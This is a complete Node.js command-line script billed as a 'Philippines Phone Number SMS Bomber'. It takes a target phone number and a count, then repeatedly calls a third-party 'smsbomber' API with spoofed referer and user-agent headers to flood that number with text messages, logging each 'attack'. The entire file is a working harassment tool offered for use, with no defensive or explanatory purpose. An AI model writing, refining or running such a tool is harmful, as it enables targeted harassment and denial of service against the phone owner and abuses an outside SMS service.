(async()=>{
    "use strict";

    // Dependencies
    const chalk = require("chalk").default
    const ky = require("ky").default

    // Variables
    const args = process.argv.slice(2)

    // Functions
    const log = (type, message)=>{
        if(type === "i") console.log(`${chalk.cyanBright("[PSMSB]")} ${message}`)
        if(type === "e") console.log(`${chalk.redBright("[PSMSB]")} ${message}`)
    }

    // Main
    if(!args.length){
        console.log("usage: node index.js <phoneNumber> <amount>")
        process.exit()
    }

    console.log(chalk.yellowBright("Philippines Phone Number SMS Bomber - NCryptsion"))
    log("i", "Bombing the phone number...")
    for( let i = 1; i <= args[1]; i++ ){
        try{
            const response = await ky.get(`https://oreo.gleeze.com/api/smsbomber?phone=${args[0]}&amount=1`, {
                headers: {
                    referer: "https://oreo.gleeze.com/",
                    "user-agent": "https://oreo.gleeze.com/"
                }
            }).json()

            response.status ? log("i", `Success. Attack: ${i}`) : log("e", `Failed. Attack: ${i}`)
        }catch{
            log("e", `Failed. Attack: ${i}`)
        }
    }

    log("i", "Attack is finished.")
})()